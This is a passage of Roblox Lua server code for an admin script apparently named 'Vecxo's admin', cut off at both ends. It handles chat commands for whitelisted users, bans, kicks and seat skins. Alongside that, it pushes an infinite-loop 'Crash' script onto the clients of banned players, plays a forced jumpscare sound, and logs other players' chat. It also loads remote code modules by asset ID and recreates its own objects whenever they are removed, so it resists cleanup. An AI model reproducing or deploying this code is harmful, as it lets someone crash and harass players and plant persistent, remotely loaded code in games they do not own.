					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Ben") then
					local Ben = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Ben"):Clone()
					local w = Instance.new("Weld", Ben)
					w.Part0 = part
					w.Part1 = Ben
					Ben.Anchored = false
					Ben.Parent = part
					Ben.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Ben") then
					local Ben = game:GetService("ReplicatedStorage"):FindFirstChild("Ben"):Clone()
					local w = Instance.new("Weld", Ben)
					w.Part0 = part
					w.Part1 = Ben
					Ben.Anchored = false
					Ben.Parent = part
					Ben.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Ben")
					local Ben = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Ben"):Clone()
					local w = Instance.new("Weld", Ben)
					w.Part0 = part
					w.Part1 = Ben
					Ben.Anchored = false
					Ben.Parent = part
					Ben.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "tom" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Tom") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tom") then
					local Tom = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tom"):Clone()
					local w = Instance.new("Weld", Tom)
					w.Part0 = part
					w.Part1 = Tom
					Tom.Anchored = false
					Tom.Parent = part
					Tom.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Tom") then
					local Tom = game:GetService("ReplicatedStorage"):FindFirstChild("Tom"):Clone()
					local w = Instance.new("Weld", Tom)
					w.Part0 = part
					w.Part1 = Tom
					Tom.Anchored = false
					Tom.Parent = part
					Tom.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Tom")
					local Tom = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Tom"):Clone()
					local w = Instance.new("Weld", Tom)
					w.Part0 = part
					w.Part1 = Tom
					Tom.Anchored = false
					Tom.Parent = part
					Tom.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "burger" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Burger") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Burger") then
					local Burger = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Burger"):Clone()
					local w = Instance.new("Weld", Burger)
					w.Part0 = part
					w.Part1 = Burger
					Burger.Anchored = false
					Burger.Parent = part
					Burger.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Burger") then
					local Burger = game:GetService("ReplicatedStorage"):FindFirstChild("Burger"):Clone()
					local w = Instance.new("Weld", Burger)
					w.Part0 = part
					w.Part1 = Burger
					Burger.Anchored = false
					Burger.Parent = part
					Burger.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Burger")
					local Burger = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Burger"):Clone()
					local w = Instance.new("Weld", Burger)
					w.Part0 = part
					w.Part1 = Burger
					Burger.Anchored = false
					Burger.Parent = part
					Burger.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "cola" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Cola") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Cola") then
					local Cola = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Cola"):Clone()
					local w = Instance.new("Weld", Cola)
					w.Part0 = part
					w.Part1 = Cola
					Cola.Anchored = false
					Cola.Parent = part
					Cola.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Cola") then
					local Cola = game:GetService("ReplicatedStorage"):FindFirstChild("Cola"):Clone()
					local w = Instance.new("Weld", Cola)
					w.Part0 = part
					w.Part1 = Cola
					Cola.Anchored = false
					Cola.Parent = part
					Cola.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Cola")
					local Cola = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Cola"):Clone()
					local w = Instance.new("Weld", Cola)
					w.Part0 = part
					w.Part1 = Cola
					Cola.Anchored = false
					Cola.Parent = part
					Cola.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "chicken" or cfgs.mode == "kfc" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Fried Chicken") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Fried Chicken") then
					local Chicken = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Fried Chicken"):Clone()
					local w = Instance.new("Weld", Chicken)
					w.Part0 = part
					w.Part1 = Chicken
					Chicken.Anchored = false
					Chicken.Parent = part
					Chicken.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Fried Chicken") then
					local Chicken = game:GetService("ReplicatedStorage"):FindFirstChild("Fried Chicken"):Clone()
					local w = Instance.new("Weld", Chicken)
					w.Part0 = part
					w.Part1 = Chicken
					Chicken.Anchored = false
					Chicken.Parent = part
					Chicken.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Fried Chicken")
					local Chicken = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Fried Chicken"):Clone()
					local w = Instance.new("Weld", Chicken)
					w.Part0 = part
					w.Part1 = Chicken
					Chicken.Anchored = false
					Chicken.Parent = part
					Chicken.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "chair" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Chair") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Chair") then
					local Chair = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Chair"):Clone()
					local w = Instance.new("Weld", Chair)
					w.Part0 = part
					w.Part1 = Chair
					Chair.Anchored = false
					Chair.Parent = part
					Chair.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Chair") then
					local Chair = game:GetService("ReplicatedStorage"):FindFirstChild("Chair"):Clone()
					local w = Instance.new("Weld", Chair)
					w.Part0 = part
					w.Part1 = Chair
					Chair.Anchored = false
					Chair.Parent = part
					Chair.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Chair")
					local Chair = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chair"):Clone()
					local w = Instance.new("Weld", Chair)
					w.Part0 = part
					w.Part1 = Chair
					Chair.Anchored = false
					Chair.Parent = part
					Chair.Locked = true
					part.Transparency = 1
				end
			end
		end
	else
		local colour3 = Color3.fromRGB(cfgs.colourR, cfgs.colourG, cfgs.colourB)
		for i, part in ipairs(parts) do
			if #part:GetChildren() >= 1 then
				for i,v in pairs(part:GetChildren()) do
					if v.Name ~= "Seat" then
						v:Destroy()
					end
				end
			end
			part.Material = cfgs.material
			part.Reflectance = cfgs.reflectance
			part.Transparency = cfgs.transparency
			part.Color = colour3
		end
	end
end

-------------------------------------------- CONNECTIONS --------------------------------------------

for i,v in pairs(game.Players:GetPlayers()) do

	if table.find(_G.Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
		notfi(v, "Vecxo's admin", "You are whitelisted! prefix is ".. _G.prefix)
	end

	cxoconnections["Chatted"] = v.Chatted:Connect(function(msg)

		if not table.find(_G.Whitelist, tostring(v.UserId)) and not table.find(TempWhitelist, v.UserId) then
			table.insert(chats, v.Name ..":" .. msg)
		end

		table.insert(messages, v.DisplayName ..": " .. msg)

		if table.find(_G.Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
			--print(v.Name .. ": ".. msg)

			if msg:sub(1, #_G.prefix) == _G.prefix then
				msg = msg:sub(#_G.prefix + 1)

				local parts = msg:split(" ")
				local cmdname = parts[1]

				local command = cmds[cmdname]
				if not command then
					for i, cmd in pairs(cmds) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local playerless = command.Data.Player
					local target
					local args

					if playerless then
						target = parts[2] or "me"
						args = {table.unpack(parts, 3)}
					else
						target = nil
						args = {table.unpack(parts, 2)}
					end

					local targets = playerless and p(target, v) or nil
					command.Data.Function(v, targets, args)
				else
					notfi(v, "Vecxo's admin", "Command '" .. cmdname .. "' was not found.")
				end	
			else
				--notfi(v, "Error", "Incorrect prefix, prefix is: ".. prefix)
			end
		else
			return
		end
	end)
end

cxoconnections["PlayerAdded"] = game.Players.PlayerAdded:Connect(function(player)

	repeat task.wait() until player and player.Character or not game.Players:FindFirstChild(player.Name)

	if table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
		task.wait(1.5)
		notfi(player, "Vecxo's admin", "You are whitelisted - prefix is ".. _G.prefix)
	end

	if table.find(AutoRespawn, player.Name) then
		cxoconnections["AntiKill3"](player)
	end

	if locked == true and not table.find(_G.Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
		player:Kick("cxo's admin | this server is locked")
	end

	if banned[player.UserId] then
		player:Kick("cxo's admin | you are banned from this server")
	end

	local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), player)
	if success and code then
		if table.find(countrybanned, countries[code]) then
			player:Kick(countries[code] .." is banned from joining this server.")
		end
	end

	if autodelete[player.UserId] then
		player:Destroy()
	end

	if player.AccountAge < tonumber(agelocknum) and agelocked then
		if table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
			return
		end
		player:Kick("Your account must be ".. agelocknum .." days old to join this server.")
	end

	if crashbanned[player.UserId] then
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg") then

			local sgui = Instance.new("ScreenGui", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
			local f = Instance.new("TextLabel", sgui)

			f.TextScaled = true
			f.Size = UDim2.new(1, 0, 1, 0)
			f.Position = UDim2.new(0, 0, 0, 0)
			f.BackgroundColor3 = Color3.new(0, 0, 0)
			f.Visible = true
			f.TextColor = BrickColor.new("Institutional white")
			f.Font = Enum.Font.SourceSansBold
			sgui.IgnoreGuiInset = true
			sgui.Name = "msg"

		end

		repeat task.wait() until player and player.PlayerGui

		local message = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg"):Clone()
		message.TextLabel.Text = "[cxo's admin]\nYou are banned from this server"
		message.Parent = player.PlayerGui

		task.wait(0.1)

		repeat task.wait() until player and player.Character

		local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
		if player.PlayerGui then
			crashscript.Parent = player.PlayerGui
		else
			if player.Character then
				crashscript.Parent = player.Character
			end
		end
	end

	cxoconnections["Chatted2"] = player.Chatted:Connect(function(msg)

		if not table.find(_G.Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
			table.insert(chats, player.Name ..":" .. msg)
		end

		table.insert(messages, player.DisplayName ..": " .. msg)

		if table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
			--print(v.Name .. ": ".. msg)

			if msg:sub(1, #_G.prefix) == _G.prefix then
				msg = msg:sub(#_G.prefix + 1)

				local parts = msg:split(" ")
				local cmdname = parts[1]

				local command = cmds[cmdname]
				if not command then
					for i, cmd in pairs(cmds) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local playerless = command.Data.Player
					local target
					local args

					if playerless then
						target = parts[2] or "me"
						args = {table.unpack(parts, 3)}
					else
						target = nil
						args = {table.unpack(parts, 2)}
					end

					local targets = playerless and p(target, player) or nil
					command.Data.Function(player, targets, args)
				else
					notfi(player, "Vecxo's admin", "Command '" .. cmdname .. "' was not found.")
				end	
			else
				--notfi(v, "Error", "Incorrect prefix, prefix is: ".. prefix)
			end
		else
			return
		end
	end)

	if configs[tostring(player.UserId)] then
		notfi(player, "Vecxo's admin", "You have configs! loading them now.", 3)
		for i, cmd in ipairs(configs[tostring(player.UserId)]) do
			local arguments = {}
			for part in cmd:gmatch("%S+") do
				table.insert(arguments, part)
			end

			local target = nil

			if arguments[2] and arguments[2] == "me" then
				target = player
			else
				if arguments[2] then
					if game.Players:FindFirstChild(arguments[2]) then
						target = game.Players:FindFirstChild(arguments[2])
					else
						target = nil
					end
				end
			end

			if target then
				runcmd(arguments[1], nil, {target}, {table.concat(arguments, " ", 3)}, nil)
			else
				runcmd(arguments[1], nil, nil, {table.concat(arguments, " ", 2)}, nil)
			end

			--runcmd(arguments[1], nil, target and {target} or nil, {table.concat(arguments, " ", 3) or table.concat(arguments, " ", 2) or nil}, nil)
		end
	end

end)

cxoconnections["Descendant"] = game.DescendantAdded:Connect(function(v)
	if muter and v:IsA("Sound") then
		if game.Soundscape:FindFirstChild(v, true) then return end
		repeat task.wait() until v.Parent ~= nil
		v:Destroy()
	end
end)

cxoconnections["Removed"] = game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
	if t.Name == "cxo's folder" then
		local a = Instance.new("Folder", game:GetService("ReplicatedStorage"))
		a.Name = "cxo's folder"

		task.wait(0.25)
		if not a:FindFirstChild("OrbScript") and not a:FindFirstChild("cxo's gmod remote") then
			local r = Instance.new("RemoteEvent", a)
			r.Name = "cxo's gmod remote"

			cxoconnections["Gmod"]()

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local r = game:GetService("ReplicatedStorage")
			local remote = r:WaitForChild("cxo's gmod remote")
			local UserInputService = game:GetService("UserInputService")
			local Mouse = game.Players.LocalPlayer:GetMouse()

			local selected = nil
			local isgrabbed = false

			local function pickup(target)
				if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
					isgrabbed = true
					selected = target
					remote:FireServer("Pickup", selected)
				end
			end

			local function update(pos)
				if selected and isgrabbed then
					remote:FireServer("Update", pos)
				end
			end

			local function release()
				if selected then
					isgrabbed = false
					selected = nil
					remote:FireServer("Release")
				end
			end

			Mouse.Button1Down:Connect(function()
				local target = Mouse.Target
				pickup(target)
			end)

			Mouse.Move:Connect(function()
				if selected and isgrabbed then
					local pos = Mouse.Hit.p
					update(pos)
				end
			end)

			Mouse.Button1Up:Connect(function()
				release()
			end)

			UserInputService.TouchStarted:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch then
					local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
					pickup(target)
				end
			end)

			UserInputService.TouchMoved:Connect(function(input)
				if selected and isgrabbed then
					local touchpos = input.Position
					local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
					local touchpos = ray.Origin + ray.Direction * 50
					update(touchpos)
				end
			end)

			UserInputService.TouchEnded:Connect(function(input)
				release()
			end)

			]]
			scr.Parent = a
			scr.Name = "RemoteScript"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local lp = game.Players.LocalPlayer
				local lpc = lp.Character

				repeat task.wait() until lpc:FindFirstChild("ff")
				lpc.ff.CanCollide = false

				script:Destroy()
			]]

			scr.Parent = a
			scr.Name = "OrbScript"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do end

			]]
			scr.Parent = a
			scr.Name = "Crash"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://17518855592"
				sound.TimePosition = 1.7
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]
			scr.Parent = a
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			local deviceremote = Instance.new("RemoteFunction", a)
			deviceremote.Name = "cxo's Device Remote"

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

			local UserInputService = game:GetService("UserInputService")
			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
		
			local devices = {
				TouchEnabled = UserInputService.TouchEnabled,
				VREnabled = UserInputService.VREnabled,
				GamepadEnabled = UserInputService.GamepadEnabled,
				MouseEnabled = UserInputService.MouseEnabled,
				KeyboardEnabled = UserInputService.KeyboardEnabled
			}
		
			local device = ""
		
			if devices.VREnabled then
				device = device .. "ü•Ω + "
			end
			if devices.GamepadEnabled then
				device = device .. "üéÆ + "
			end
			if devices.TouchEnabled then
				device = device .. "üì± + "
			end
			if devices.MouseEnabled and devices.KeyboardEnabled then
				device = device .. "‚å®Ô∏èüñ±Ô∏è + "
			elseif devices.MouseEnabled then
				device = device .. "üñ±Ô∏è + "
			elseif devices.KeyboardEnabled then
				device = device .. "‚å®Ô∏è + "
			end
		
			if device:sub(-3) == " + " then
				device = device:sub(1, -4)
			end
		
			if device == "" then
				device = "‚ùì"
			end
		
			if remote then
				remote:InvokeServer(device)
			end
		
			]]

			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
			scr.Name = "cxo's Device LocalScript"
			scr.Enabled = true

			local deviceremote = Instance.new("RemoteFunction", a)
			deviceremote.Name = "cxo's Device Remote"

			local cxor = Instance.new("RemoteEvent", a)
			cxor.Name = "cxo's remote"

			cxoconnections["Scanner"]()
			scan()
			cxoconnections["RemoteListener"]()
			cxoconnections["RemoteFListener"]()

			local cmdbarr = Instance.new("RemoteEvent", a)
			cmdbarr.Name = "cmdbar remote"

			local remotefunc = Instance.new("RemoteFunction", a)
			remotefunc.Name = "cxo's remotefunction"
		end
	end
end)

function scan()
	game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder").ChildRemoved:Connect(function(t)
		local a = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
		if t.Name == "cxo's gmod remote" then
			local r = Instance.new("RemoteEvent", a)
			r.Name = "cxo's gmod remote"

			if cxoconnections["Gmod"] then
				cxoconnections["Gmod"]()
			end

		elseif t.Name == "RemoteScript" then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
				
			local r = game:GetService("ReplicatedStorage")
			local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
			local UserInputService = game:GetService("UserInputService")
			local Mouse = game.Players.LocalPlayer:GetMouse()

			local selected = nil
			local isgrabbed = false

			local function pickup(target)
				if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
					isgrabbed = true
					selected = target
					remote:FireServer("Pickup", selected)
				end
			end

			local function update(pos)
				if selected and isgrabbed then
					remote:FireServer("Update", pos)
				end
			end

			local function release()
				if selected then
					isgrabbed = false
					selected = nil
					remote:FireServer("Release")
				end
			end

			Mouse.Button1Down:Connect(function()
				local target = Mouse.Target
				pickup(target)
			end)

			Mouse.Move:Connect(function()
				if selected and isgrabbed then
					local pos = Mouse.Hit.p
					update(pos)
				end
			end)

			Mouse.Button1Up:Connect(function()
				release()
			end)

			UserInputService.TouchStarted:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch then
					local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
					pickup(target)
				end
			end)

			UserInputService.TouchMoved:Connect(function(input)
				if selected and isgrabbed then
					local touchpos = input.Position
					local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
					local touchpos = ray.Origin + ray.Direction * 50
					update(touchpos)
				end
			end)

			UserInputService.TouchEnded:Connect(function(input)
				release()
			end)

			]]

			scr.Parent = a
			scr.Name = "RemoteScript"
			scr.Enabled = true

		elseif t.Name == "OrbScript" then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local lp = game.Players.LocalPlayer
			local lpc = lp.Character

			repeat task.wait() until lpc:FindFirstChild("ff")
			lpc.ff.CanCollide = false

			script:Destroy()

			]]
			scr.Parent = a
			scr.Name = "OrbScript"
			scr.Enabled = true

		elseif t.Name == "Crash" then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			while true do end

			]]
			scr.Parent = a
			scr.Name = "Crash"
			scr.Enabled = true

		elseif t.Name == "JumpScareScript" then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://17518855592"
			sound.TimePosition = 1.7
			sound.Volume = 10
			sound:Play()
			sound.Ended:Connect(function()
				sound:Destroy()
				script:Destroy()
			end)

			]]
			scr.Parent = a
			scr.Name = "JumpScareScript"
			scr.Enabled = true

		elseif t.Name == "cxo's Device Remote" then
			local deviceremote = Instance.new("RemoteFunction", a)
			deviceremote.Name = "cxo's Device Remote"

			if cxoconnections["Scanner"] then
				cxoconnections["Scanner"]()
			end

		elseif t.Name == "cxo's Device LocalScript" then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

			local UserInputService = game:GetService("UserInputService")
			local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
		
			local devices = {
				TouchEnabled = UserInputService.TouchEnabled,
				VREnabled = UserInputService.VREnabled,
				GamepadEnabled = UserInputService.GamepadEnabled,
				MouseEnabled = UserInputService.MouseEnabled,
				KeyboardEnabled = UserInputService.KeyboardEnabled
			}
		
			local device = ""
		
			if devices.VREnabled then
				device = device .. "ü•Ω + "
			end
			if devices.GamepadEnabled then
				device = device .. "üéÆ + "
			end
			if devices.TouchEnabled then
				device = device .. "üì± + "
			end
			if devices.MouseEnabled and devices.KeyboardEnabled then
				device = device .. "‚å®Ô∏èüñ±Ô∏è + "
			elseif devices.MouseEnabled then
				device = device .. "üñ±Ô∏è + "
			elseif devices.KeyboardEnabled then
				device = device .. "‚å®Ô∏è + "
			end
		
			if device:sub(-3) == " + " then
				device = device:sub(1, -4)
			end
		
			if device == "" then
				device = "‚ùì"
			end
		
			if remote then
				remote:InvokeServer(device)
			end
		
			]]

			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
			scr.Name = "cxo's Device LocalScript"
			scr.Enabled = true

		elseif t.Name == "cxo's remote" then
			local cxor = Instance.new("RemoteEvent", a)
			cxor.Name = "cxo's remote"

			if cxoconnections["RemoteListener"] then
				cxoconnections["RemoteListener"]()
			end

		elseif t.Name == "cmdbar remote" then
			local cmdbarr = Instance.new("RemoteEvent", a)
			cmdbarr.Name = "cmdbar remote"
		elseif t.Name == "cxo's remotefunction" then
			local remotefunc = Instance.new("RemoteFunction", a)
			remotefunc.Name = "cxo's remotefunction"

			if cxoconnections["RemoteFListener"] then
				cxoconnections["RemoteFListener"]()
			end
		end
	end)
end

function start()
	local a = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
	--[[local r = Instance.new("RemoteEvent", a)
	r.Name = "cxo's gmod remote"]]

	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
